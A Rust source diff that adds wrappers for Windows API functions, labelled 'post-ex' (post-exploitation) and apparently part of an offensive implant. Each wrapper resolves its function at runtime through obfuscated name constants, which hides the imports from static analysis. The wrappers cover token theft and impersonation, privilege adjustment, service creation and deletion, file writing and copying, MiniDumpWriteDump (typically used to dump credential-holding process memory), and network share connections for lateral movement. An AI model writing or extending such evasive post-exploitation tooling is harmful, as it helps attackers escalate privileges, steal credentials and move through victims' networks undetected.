@@ -574,3 +574,130 @@ pub unsafe fn GetAdaptersInfo(info: *mut c_void, size: *mut u32) -> u32 {
     let f: F = std::mem::transmute(resolve_load(crate::obf::IPHLPAPI, crate::obf::W_GET_ADAPTERS_INFO));
     f(info, size)
 }
+
+// ── advapi32 post-ex (token / service) ──────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn OpenProcessToken(process: *mut c_void, access: u32, token: *mut *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_OPEN_PROCESS_TOKEN));
+    f(process, access, token)
+}
+
+#[cfg(windows)]
+pub unsafe fn AdjustTokenPrivileges(
+    token: *mut c_void, disable_all: i32, new_state: *const c_void,
+    buf_len: u32, prev_state: *mut c_void, ret_len: *mut u32,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, i32, *const c_void, u32, *mut c_void, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_ADJUST_TOKEN_PRIVILEGES));
+    f(token, disable_all, new_state, buf_len, prev_state, ret_len)
+}
+
+#[cfg(windows)]
+pub unsafe fn LookupPrivilegeValueA(system: *const u8, name: *const u8, luid: *mut u64) -> i32 {
+    type F = unsafe extern "system" fn(*const u8, *const u8, *mut u64) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_LOOKUP_PRIVILEGE_VALUE_A));
+    f(system, name, luid)
+}
+
+#[cfg(windows)]
+pub unsafe fn DuplicateTokenEx(
+    existing: *mut c_void, access: u32, attrs: *const c_void,
+    impersonation: i32, token_type: i32, new_token: *mut *mut c_void,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *const c_void, i32, i32, *mut *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_DUPLICATE_TOKEN_EX));
+    f(existing, access, attrs, impersonation, token_type, new_token)
+}
+
+#[cfg(windows)]
+pub unsafe fn ImpersonateLoggedOnUser(token: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_IMPERSONATE_LOGGED_ON_USER));
+    f(token)
+}
+
+#[cfg(windows)]
+pub unsafe fn RevertToSelf() -> i32 {
+    type F = unsafe extern "system" fn() -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_REVERT_TO_SELF));
+    f()
+}
+
+#[cfg(windows)]
+pub unsafe fn StartServiceA(service: *mut c_void, argc: u32, argv: *const *const u8) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *const *const u8) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_START_SERVICE_A));
+    f(service, argc, argv)
+}
+
+#[cfg(windows)]
+pub unsafe fn DeleteService(service: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_DELETE_SERVICE));
+    f(service)
+}
+
+// ── kernel32 file I/O (post-ex) ─────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn CreateFileA(
+    name: *const u8, access: u32, share: u32, attrs: *const c_void,
+    disposition: u32, flags: u32, template: *mut c_void,
+) -> *mut c_void {
+    type F = unsafe extern "system" fn(*const u8, u32, u32, *const c_void, u32, u32, *mut c_void) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_FILE_A));
+    f(name, access, share, attrs, disposition, flags, template)
+}
+
+#[cfg(windows)]
+pub unsafe fn WriteFile(
+    file: *mut c_void, buffer: *const u8, to_write: u32, written: *mut u32, overlapped: *mut c_void,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_WRITE_FILE));
+    f(file, buffer, to_write, written, overlapped)
+}
+
+#[cfg(windows)]
+pub unsafe fn GetFileSize(file: *mut c_void, high: *mut u32) -> u32 {
+    type F = unsafe extern "system" fn(*mut c_void, *mut u32) -> u32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_FILE_SIZE));
+    f(file, high)
+}
+
+#[cfg(windows)]
+pub unsafe fn CopyFileA(source: *const u8, dest: *const u8, fail_if_exists: i32) -> i32 {
+    type F = unsafe extern "system" fn(*const u8, *const u8, i32) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_COPY_FILE_A));
+    f(source, dest, fail_if_exists)
+}
+
+// ── dbghelp (post-ex) ──────────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn MiniDumpWriteDump(
+    process: *mut c_void, pid: u32, file: *mut c_void, dump_type: u32,
+    exception: *const c_void, user_stream: *const c_void, callback: *const c_void,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *const c_void, *const c_void, *const c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::DBGHELP, crate::obf::W_MINI_DUMP_WRITE_DUMP));
+    f(process, pid, file, dump_type, exception, user_stream, callback)
+}
+
+// ── mpr (post-ex network) ──────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn WNetAddConnection2A(resource: *const c_void, password: *const u8, username: *const u8, flags: u32) -> u32 {
+    type F = unsafe extern "system" fn(*const c_void, *const u8, *const u8, u32) -> u32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::MPR, crate::obf::W_WNET_ADD_CONNECTION2_A));
+    f(resource, password, username, flags)
+}
+
+#[cfg(windows)]
+pub unsafe fn WNetCancelConnection2A(name: *const u8, flags: u32, force: i32) -> u32 {
+    type F = unsafe extern "system" fn(*const u8, u32, i32) -> u32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::MPR, crate::obf::W_WNET_CANCEL_CONNECTION2_A));
+    f(name, flags, force)
+}
